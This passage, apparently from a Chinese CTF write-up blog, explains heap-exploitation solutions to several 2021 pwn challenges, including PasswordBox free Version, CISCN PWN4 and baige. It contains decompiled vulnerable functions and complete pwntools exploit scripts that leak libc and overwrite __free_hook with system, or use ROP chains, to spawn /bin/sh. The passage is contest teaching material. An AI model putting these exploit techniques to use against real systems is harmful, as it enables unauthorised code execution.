class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x71&#x27;</span>)  <span class="comment">#chunk1 =&gt; 0x71</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">tacahe_addr = heap - <span class="number">0x2C8</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x51</span>)+p64(tacahe_addr))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4	</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(heap-<span class="number">0x319</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 </span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>p.s. 本题的flag在/home/ctf/flag.txt</p>
<h2 id="2021-祥云杯-PasswordBox-free-Version"><a class="header-anchor" href="#2021-祥云杯-PasswordBox-free-Version">¶</a>[2021 祥云杯]PasswordBox free Version</h2>
<h3 id="题目考点-v3"><a class="header-anchor" href="#题目考点-v3">¶</a>题目考点</h3>
<pre><code>1.异或算法
2.off by null
3.Unlink
4.glibc 2.27 -v1.4 double free
</code></pre>
<h3 id="功能分析"><a class="header-anchor" href="#功能分析">¶</a>功能分析</h3>
<p>add函数主要代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size &lt;= <span class="number">0x100</span> )</span><br><span class="line">&#123;</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your Pwd:&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  fgets(s, size + <span class="number">1</span>, <span class="built_in">stdin</span>);                <span class="comment">// off by null</span></span><br><span class="line">  encrypt((__int64)s, size);</span><br><span class="line">  *((_DWORD *)&amp;lenarray + <span class="number">8</span> * SHIDWORD(size)) = size;</span><br><span class="line">  *((_QWORD *)&amp;heaparray + <span class="number">4</span> * SHIDWORD(size)) = s;</span><br><span class="line">  isAlive[<span class="number">8</span> * SHIDWORD(size)] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !ifFirst )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First Add Done.Thx 4 Use. Save ID:%s&quot;</span>, *((<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;heaparray + <span class="number">4</span> * SHIDWORD(size)));</span><br><span class="line">    ifFirst = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fgets 存在off by null 可以让我们后面修改chunk的size</p>
<p>且输入的content会进行一次加密，加密函数如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">encrypt</span><span class="params">(__int64 note, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">2</span> * (a2 / <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 % <span class="number">16</span> &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 % <span class="number">16</span> &gt; <span class="number">0</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_QWORD *)(<span class="number">8LL</span> * i + note) ^= key;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到是以八位为单位进行亦或操作，但是每次的key都是随机生成的，而由于获取我们输入的是fgets,当它读到&quot;\n&quot;且你输入的content小于size，就会将剩下的用0填充，由于0^key=key这样我们就能得到key了</p>
<p>edit函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !isFirst )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">    getchar();</span><br><span class="line">    isFirst = <span class="number">1LL</span>;</span><br><span class="line">    read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;heaparray + <span class="number">4</span> * v1), <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Because this is Free Version.The edit Function is Limit to use&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个堆，一生只能edit1次，且只能改0x10的大小</p>
<p>free和show都是正常的free和show</p>
<p>##解题步骤<br>
Step1: 获得key<br>
利用a ^ 0 = a的特性，得到key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Save ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br></pre></td></tr></table></figure>
<p>Step2:构造overlapped chunk leak libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#填满tacahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#0 (7)</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1  (8)</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2 (9)</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3  (10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line">free(<span class="number">7</span>)  <span class="comment">#free一个正常的chunk以便绕过Unlink检测</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64((<span class="number">0x80</span>+<span class="number">0x100</span>)^key)) <span class="comment">#size = chunk8 + chunk7</span></span><br><span class="line">free(<span class="number">9</span>)   <span class="comment">#unlink </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) ^ key </span><br><span class="line">libc_base -= <span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
<p>Step3:double free修改free_hook,注意在第二次free之前要修改标志位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#double free</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook^key))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system^key))</span><br><span class="line">add(<span class="number">0x60</span>,p64(binsh^key))</span><br><span class="line">free(<span class="number">5</span>) </span><br></pre></td></tr></table></figure>
<h3 id="EXP-v2"><a class="header-anchor" href="#EXP-v2">¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;pwdFree&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwdFree&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input The ID You Want Save:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Length Of Your Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Which PwdBox You Want Check:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input Your Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Idx you want 2 Delete:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Save ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#0 (7)</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1  (8)</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2 (9)</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3  (10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line">free(<span class="number">7</span>)  <span class="comment"># -&gt;unsortdebin</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64((<span class="number">0x80</span>+<span class="number">0x100</span>)^key)) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">9</span>)   <span class="comment">#unlink </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overlap</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) ^ key </span><br><span class="line">libc_base -= <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#one = [0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">binsh = u64(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#tacahe check bypass</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#double free</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook^key))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system^key))</span><br><span class="line">add(<span class="number">0x60</span>,p64(binsh^key))</span><br><span class="line">free(<span class="number">5</span>) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2021-PWN4"><a class="header-anchor" href="#CISCN-2021-PWN4">¶</a>[CISCN 2021]PWN4</h2>
<h3 id="题目解析"><a class="header-anchor" href="#题目解析">¶</a>题目解析</h3>
<p>具体见我前面UAF的文章</p>
<h3 id="exp-v7"><a class="header-anchor" href="#exp-v7">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;crash&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.43.181&#x27;,55000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;add &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Pls give data size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure?:&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x0b\x00&#x27;</span>) </span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xd0b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000119c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000a80 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000929 : ret</span></span><br><span class="line"><span class="string">0x0000000000000962 : ret 0x2016</span></span><br><span class="line"><span class="string">0x000000000000102b : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000000dd2 : ret 0x8d48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x11a3</span></span><br><span class="line">puts_plt = elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf_base + elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_4 = elf_base + <span class="number">0x119c</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_6 = elf_base + <span class="number">0x119a</span></span><br><span class="line">rop2 = elf_base + <span class="number">0x1180</span></span><br><span class="line">bin_sh = elf_base + <span class="number">0x202080</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4))</span><br><span class="line">payload1 = p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh)+p64(<span class="number">0</span>)+p64(rop2)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">56</span>+p64(main)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;yes\x00\x00\x00\x00\x00&quot;</span> + payload1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4))</span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main)</span><br><span class="line">payload2 = <span class="string">b&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + payload2</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="长安杯-2021学生组-baige"><a class="header-anchor" href="#长安杯-2021学生组-baige">¶</a>[长安杯 2021学生组]baige</h2>
<h3 id="题目考点-v4"><a class="header-anchor" href="#题目考点-v4">¶</a>题目考点</h3>
<pre><code>1.unsorted bin attact 
2.逻辑漏洞
</code></pre>
<h3 id="IDA-分析-v2"><a class="header-anchor" href="#IDA-分析-v2">¶</a>IDA 分析</h3>
<p>本题功能add,show,edit,delete一应俱全</p>
<p>漏洞点在add函数中</p>
<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="6.png-37.4kB"></p>
<p>add 函数用一个数组来储存size，<strong>而且在进入检查之前就会对数组中的值赋值</strong>，这就意味着我可以利用这点来修改已经申请到的堆块的大小造成堆溢出</p>
<h3 id="解题思路"><a class="header-anchor" href="#解题思路">¶</a>解题思路</h3>
<p>Step1: leak libc<br>
本题题目环境位2.27需要填满tacahe,来Unsorted bin attack</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>)  <span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa\n&#x27;</span>)</span><br><span class="line">libc_base = (u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span>) -<span class="number">0x3ebd00</span></span><br></pre></td></tr></table></figure>
<p>Step2: 利用逻辑漏洞制造堆溢出，打free_hook来getshell</p>
